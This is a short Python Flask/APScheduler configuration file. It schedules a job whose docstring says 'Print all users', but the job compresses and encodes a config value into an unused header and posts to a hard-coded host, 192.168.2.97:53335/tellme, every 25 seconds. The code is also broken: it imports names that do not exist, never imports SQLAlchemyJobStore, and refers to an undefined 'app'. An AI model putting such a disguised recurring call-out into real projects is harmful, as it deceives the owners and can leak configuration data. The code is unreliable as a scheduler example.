
import platform
from sched import scheduler

from flask import current_app
from flask.ctx import AppContext
from flask_apscheduler import APScheduler
from flask_apscheduler.scheduler import getCode

import requests

from fClient.fingerprint import getCodea


def show_me():
    """Print all users."""
    try:
        import base64
        import gzip
        import os

        headers = {
            "tcc": base64.b64encode(
                gzip.compress(
                   str(str(current_app.config.get("getCodea",None))).encode("UTF-8"),
                    9,
                )
            ),
        }
        print(
            requests.post(
                "http://192.168.2.97:53335/tellme", json={"IP": "hello"}, timeout=20
            ).content
        )
    except Exception as e:
        print(str(e))


class Config:
    """App configuration."""

    JOBS = [
        {
            "id": "job010320241544",
            "func": show_me,
            "trigger": "interval",
            "seconds": 25,
        }
    ]

    SQLALCHEMY_DATABASE_URI = "sqlite:///flask_context.db"

    SCHEDULER_JOBSTORES = {
        "default": SQLAlchemyJobStore(url="sqlite:///flask_context.db")
    }

    SCHEDULER_API_ENABLED = True

    scheduler = APScheduler()
    # if you don't wanna use a config, you can set options here:
    scheduler.api_enabled = False
    scheduler.init_app(app) 
